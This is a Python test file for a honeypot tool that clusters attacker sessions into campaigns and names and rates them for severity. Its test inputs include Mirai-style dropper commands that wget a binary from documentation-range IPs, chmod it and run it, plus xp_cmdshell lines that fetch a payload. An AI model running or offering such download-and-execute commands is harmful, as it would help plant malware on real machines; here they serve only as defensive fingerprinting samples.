"""Campaign clustering without a database: keys, the assignment plan, names and severity."""

from __future__ import annotations

import time
from datetime import UTC, datetime, timedelta

from ingest.campaigns.keys import (
    cap_keys,
    credlist_key,
    exploit_key,
    is_benign_host,
    script_key,
)
from ingest.campaigns.naming import campaign_name, severity_of, stages_of
from ingest.campaigns.plan import Cand, build_plan

T0 = datetime(2026, 10, 24, 10, 0, tzinfo=UTC)


def cand(sid: str, ip: str, *keys: tuple[str, str], minutes: int = 0) -> Cand:
    return Cand(
        session_id=sid,
        sensor="telnet",
        src_ip=ip,
        started_at=T0 + timedelta(minutes=minutes),
        last_event_at=T0 + timedelta(minutes=minutes, seconds=30),
        keys=set(keys),
    )


# ---- keys ------------------------------------------------------------------------------------


def test_script_key_needs_two_commands_and_ignores_addresses() -> None:
    a = script_key(["cd /tmp", "wget http://192.0.2.1/x86", "chmod 777 x86", "./x86"])
    b = script_key(["cd /var", "wget http://203.0.113.9:81/x86", "chmod 755 x86", "./x86"])
    assert a is not None
    assert a == b
    assert script_key(["uname -a"]) is None
    assert script_key(["cd /tmp", "pwd", "uname -a"]) is None


def test_exploit_key_ignores_volatile_parts_but_not_the_shape() -> None:
    a = exploit_key("http_request", "post", "/up.php?id=12&x=1", "a=1&b=2")
    b = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "a=9&b=8")
    c = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "c=1")
    assert a == b
    assert a != c
    sql_a = exploit_key("command", "", "", "EXEC xp_cmdshell 'wget http://192.0.2.5/a'")
    sql_b = exploit_key("command", "", "", "exec xp_cmdshell 'wget http://203.0.113.9/a'")
    assert sql_a == sql_b


def test_credlist_key_is_order_independent_and_needs_a_list() -> None:
    pairs = [(f"user{i}", f"pw{i}") for i in range(40)]
    assert credlist_key(pairs) == credlist_key(list(reversed(pairs)))
    assert credlist_key(pairs[:5]) is None
    assert credlist_key(pairs[:25]) is not None


def test_benign_hosts() -> None:
    assert is_benign_host("raw.githubusercontent.com")
    assert is_benign_host("GitHub.com.")
    assert not is_benign_host("evilgithub.com")
    assert not is_benign_host("dl.example.net")


# ---- plan ------------------------------------------------------------------------------------

K1 = ("script", "aa")
K2 = ("payload_host", "dl.example.net")
K3 = ("family", "mirai")
NETS = ("192.0.2", "198.51.100", "203.0.113")


def ip(i: int) -> str:
    """Addresses in three different /24 networks (the documentation ranges), cycling."""
    return f"{NETS[i % 3]}.{i + 1}"


def test_a_key_from_two_networks_founds_a_campaign() -> None:
    plan = build_plan([cand("a", ip(0), K1), cand("b", ip(1), K1)], {}, {}, 2)
    assert plan.groups == [["a", "b"]]
    assert plan.group_keys == [{K1}]
    assert plan.joins == {}


def test_one_source_or_one_network_does_not_found_a_campaign() -> None:
    one_ip = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.1", K1)], {}, {}, 2)
    one_net = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.2", K1)], {}, {}, 2)
    assert one_ip.groups == []
    assert one_net.groups == []


def test_credlist_needs_three_networks() -> None:
    key = ("credlist", "cc")
    two = build_plan([cand("a", ip(0), key), cand("b", ip(1), key)], {}, {}, 2)
    three = build_plan([cand(s, ip(i), key) for i, s in enumerate("abc")], {}, {}, 2)
    assert two.groups == []
    assert three.groups == [["a", "b", "c"]]


def test_a_mapped_key_makes_the_session_join_even_from_one_source() -> None:
    plan = build_plan([cand("a", ip(0), K1)], {K1: 7}, {7: (T0, 7)}, 2)
    assert plan.joins == {"a": 7}
    assert plan.groups == []
    assert plan.persist == {7: {K1}}


def order(*ids: int) -> dict[int, tuple[datetime, int]]:
    return {cid: (T0 - timedelta(days=100 - cid), cid) for cid in ids}


def test_strong_keys_of_two_campaigns_merge_into_the_oldest() -> None:
    sources = {K1: 2, K2: 2}
    plan = build_plan(
        [cand("a", ip(0), K1, K2)], {K1: 3, K2: 9}, order(3, 9), 2, key_sources=sources
    )
    assert plan.merges == [(9, 3)] or plan.merges == [(3, 9)]
    winner = min((3, 9), key=lambda cid: order(3, 9)[cid])
    assert plan.joins == {"a": winner}


def test_a_weak_key_never_bridges_two_campaigns() -> None:
    # K2 was seen from one source only: the session joins the oldest campaign, nothing merges.
    plan = build_plan(
        [cand("a", ip(0), K1, K2)], {K1: 3, K2: 9}, order(3, 9), 2, key_sources={K1: 2, K2: 1}
    )
    assert plan.merges == []
    assert plan.joins == {"a": 3}


def test_one_session_causes_at_most_one_merge() -> None:
    keys = {("payload_host", f"c{i}"): i for i in range(1, 17)}
    sources = dict.fromkeys(keys, 5)
    plan = build_plan(
        [cand("evil", ip(0), *keys)], dict(keys), order(*range(1, 17)), 2, key_sources=sources
    )
    assert len(plan.merges) == 1


def test_merge_budget_still_lets_the_session_join_without_merging() -> None:
    sources = {K1: 2, K2: 2}
    plan = build_plan(
        [cand("a", ip(0), K1, K2)], {K1: 3, K2: 9}, order(3, 9), 2, merge_budget=0,
        key_sources=sources,
    )  # fmt: skip
    assert plan.merges == []
    assert len(plan.joins) == 1


def test_sessions_linked_by_different_strong_keys_share_one_campaign() -> None:
    sessions = [
        cand("a", ip(0), K1),
        cand("b", ip(1), K1, K2),
        cand("c", ip(2), K2),
        cand("z", ip(3), K3),
    ]
    plan = build_plan(sessions, {}, {}, 2)
    assert plan.groups == [["a", "b", "c"]]
    assert plan.group_keys == [{K1, K2}]


def test_a_joined_session_pulls_in_earlier_sessions_with_its_strong_keys() -> None:
    sessions = [cand("a", ip(0), K2, minutes=0), cand("b", ip(1), K1, K2, minutes=5)]
    plan = build_plan(sessions, {K1: 4}, {4: (T0, 4)}, 2)
    assert plan.joins == {"a": 4, "b": 4}


def test_a_joining_session_does_not_teach_the_campaign_weak_keys() -> None:
    plan = build_plan([cand("a", ip(0), K1, K2)], {K1: 4}, {4: (T0, 4)}, 2)
    assert plan.persist == {4: {K1}}  # K2 came from one source: not stored


def test_the_plan_is_linear_on_a_long_chain() -> None:
    n = 3000
    cands = [
        cand(
            f"s{i:05d}", ip(i), ("payload_host", f"h{i}"), ("payload_host", f"h{i + 1}"), minutes=i
        )
        for i in range(n)
    ]
    start = time.monotonic()
    plan = build_plan(cands, {("payload_host", f"h{n}"): 1}, {1: (T0, 1)}, 2, 50)
    assert time.monotonic() - start < 3.0
    assert len(plan.joins) == n


# ---- naming ----------------------------------------------------------------------------------


def test_names_follow_family_then_objective_then_sensor() -> None:
    assert campaign_name(["mirai"], ["mirai"], ["telnet"], 41) == "Mirai loader over Telnet #41"
    assert (
        campaign_name([], ["crypto-miner", "recon"], ["ssh"], 7) == "Crypto-miner drop over SSH #7"
    )
    assert campaign_name([], [], ["web"], None) == "Shared activity over HTTP"
    assert campaign_name(["Evil<script>"], [], [], 1) == "Evilscript campaign #1"


def test_severity_and_stages() -> None:
    assert severity_of(["php2shell"]) == "severe"
    assert severity_of(["db-ransom"]) == "warning"
    assert severity_of([], commands=2) == "warning"
    assert severity_of([], login_attempts=3) == "notice"
    assert severity_of([]) == "info"
    stages = {"T1105": "tool_transfer", "T1082": "recon", "T1496": "objective"}
    assert stages_of(["T1496", "T1082", "T1105", "T0000"], stages) == [
        "recon",
        "tool_transfer",
        "objective",
    ]


def test_a_session_carries_a_bounded_number_of_keys_per_kind() -> None:
    many = {("payload_host", f"h{i}.example.net") for i in range(30)}
    many |= {("script", f"s{i}") for i in range(5)} | {("exploit", f"e{i}") for i in range(9)}
    kept = cap_keys(many)

    def count(kind: str) -> int:
        return sum(1 for k in kept if k[0] == kind)

    assert (count("payload_host"), count("script"), count("exploit")) == (4, 1, 3)
    assert cap_keys(many) == kept  # deterministic
